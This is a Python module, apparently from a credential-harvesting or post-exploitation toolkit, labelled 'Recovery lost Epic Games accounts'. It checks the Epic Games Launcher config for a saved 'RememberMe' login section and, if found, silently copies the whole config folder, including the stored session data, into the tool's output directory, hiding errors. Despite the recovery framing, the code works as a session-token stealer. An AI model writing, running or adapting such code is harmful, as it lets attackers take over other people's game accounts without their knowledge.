import os
import shutil

from config import ModuleManager, Constant


class EpicGamesRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name = "EpicGamesRecovery", module_path="applications/epicgames")
        
        self.banner(r"""
     _______         ______         _             _____                                 
    |.-----.|       (______)       (_)           (_____)                     ____  ____ 
    ||x . x||       (_)__    ____   _    ___    (_)  ___   ____   __   __   (____)(____)
    ||_.-._||       (____)  (____) (_) _(___)   (_) (___) (____) (__)_(__) (_)_(_)(_)__ 
    `--)-(--`       (_)____ (_)_(_)(_)(_)___    (_)___(_)( )_( )(_) (_) (_)(__)__  _(__)
   __[=== o]___     (______)(____) (_) (____)    (_____)  (__)_)(_) (_) (_) (____)(____)
  |:::::::::::|\            (_)                                                         
  `-=========-`()           (_)                                                                     
                                   Recovery lost Epic Games accounts
                    """)

        self.epic_installation = Constant.userprofile_dir / "EpicGamesLauncher" / "Saved" / "Config" / "Windows"

    def run(self) -> None:
        recovered = False
        if os.path.isdir(self.epic_installation):
            loginFile = os.path.join(self.epic_installation, "GameUserSettings.ini") 
            if os.path.isfile(loginFile):
                self.mdebug(f"Checking {loginFile}")
                with open(loginFile) as file:
                    contents = file.read()
                    if "[RememberMe]" in contents:
                        try:
                            for file in os.listdir(self.epic_installation):
                                if os.path.isfile(os.path.join(self.epic_installation, file)):
                                    shutil.copy(
                                        os.path.join(self.epic_installation, file),
                                        os.path.join(self.module_output, file),
                                    )
                            shutil.copytree(self.epic_installation, self.module_output, dirs_exist_ok=True)
                            recovered = True
                        except Exception:
                            pass
            else:
                self.mdebug(f"Unable to find {loginFile}")
        else:
            self.mdebug(f"Unable to find EpicGames Launcher installation at: {self.epic_installation}")
        if recovered:
            self.mprint(f"Recovered Epic Games")
        else:
            self.merror(f"Unable to recover Epic Games")
